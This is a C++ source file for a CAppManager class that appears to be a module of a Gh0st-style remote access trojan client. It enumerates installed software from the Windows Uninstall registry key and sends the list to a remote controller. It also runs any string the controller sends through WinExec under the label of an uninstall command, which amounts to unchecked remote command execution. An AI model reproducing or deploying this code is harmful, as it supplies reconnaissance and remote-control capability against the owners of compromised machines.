// AppManager.cpp: implementation of the CAppManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "AppManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAppManager::CAppManager(CClientSocket *pClient) : CManager(pClient)
{
	SendSoftWareList();
}

CAppManager::~CAppManager()
{

}

void CAppManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	// 发送软件信息列表
	case COMMAND_SOFTWARELIST:
		SendSoftWareList();
		break;
	case COMMAND_APPUNINSTALL:
		WinExec((LPCSTR)lpBuffer + 1,SW_SHOW);
		break;
	default:
		return;
	}
}


void CAppManager::SendSoftWareList()
{
	LPBYTE	lpBuffer = getSoftWareList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


LPBYTE CAppManager::getSoftWareList()
{
	const int  MAX_LEG = 256 * sizeof(TCHAR);

	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	TCHAR regBufferValue[MAX_LEG] = {0};
	TCHAR regDisplayName[MAX_LEG] = {0};
	TCHAR regPublisher[MAX_LEG] = {0};
	TCHAR regDisplayVersion[MAX_LEG] = {0};
	TCHAR regInstallDate[MAX_LEG] = {0};
	TCHAR regUninstallString[MAX_LEG] = {0};

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(lpBuffer == NULL)
		return NULL;

	lpBuffer[0] = TOKEN_SOFTWARE;

	int n  = 0;
	HKEY hKey;
	DWORD dwRegNum = MAX_LEG;
	TCHAR regBufferName[MAX_LEG] = {0};
	if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
		NULL, KEY_READ, &hKey) == ERROR_SUCCESS    ) 
	{
		if( RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL)    ==    ERROR_SUCCESS )
		{

			for( int i = 0; i < (int)dwRegNum; i++ ) 
			{    
				DWORD dwRegSize = MAX_LEG;
				RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
				DWORD dwType; 
				HKEY hSubKey;
				if(  RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
				{
					
					dwRegSize = MAX_LEG;
					memset(regDisplayName,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);


					dwRegSize = MAX_LEG;
					memset(regBufferValue,0,MAX_LEG);
					// 取ParentKeyName键值,判断是否是补丁信息, 是补丁信息键值为"OperatingSystem"
					RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
					if( lstrlen(regDisplayName) == 0 || lstrcmp( regBufferValue,"OperatingSystem") == 0 ) //判断是否是补丁信息 
					{
						continue;
					}

					
					dwRegSize = MAX_LEG;
					memset(regPublisher,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "Publisher", 0, &dwType,(LPBYTE)regPublisher, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regDisplayVersion,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regInstallDate,0,MAX_LEG);
					// 判断是否能在注册表中获取到安装时间, 否取子项创建时间
					if(RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS )
					{
					}
					else
					{
						FILETIME fileLastTime;
						RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 
							NULL, NULL, NULL, &fileLastTime);
						SYSTEMTIME sTime, stLocal ;
						FileTimeToSystemTime(&fileLastTime,&sTime);
						SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
						TCHAR tchTime[MAX_LEG] = {0};
						wsprintf(tchTime,"%d%02d%02d",stLocal.wYear,stLocal.wMonth,stLocal.wDay);
						lstrcpy(regInstallDate,tchTime);
					}

					dwRegSize = MAX_LEG;
					memset(regUninstallString,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);
	

					// 缓冲区太小，再重新分配下
					dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);


					memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) + 1);
			    	dwOffset += lstrlen(regDisplayName) + 1;

					memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) + 1);
			    	dwOffset += lstrlen(regPublisher) + 1;

					memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) + 1);
			    	dwOffset += lstrlen(regDisplayVersion) + 1;

					memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) + 1);
			    	dwOffset += lstrlen(regInstallDate) + 1;

					memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) + 1);
			    	dwOffset += lstrlen(regUninstallString) + 1;										
				}             
			}
		}
	}
	else 
	{
		return FALSE; //打开键失败
	}

	RegCloseKey(hKey);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}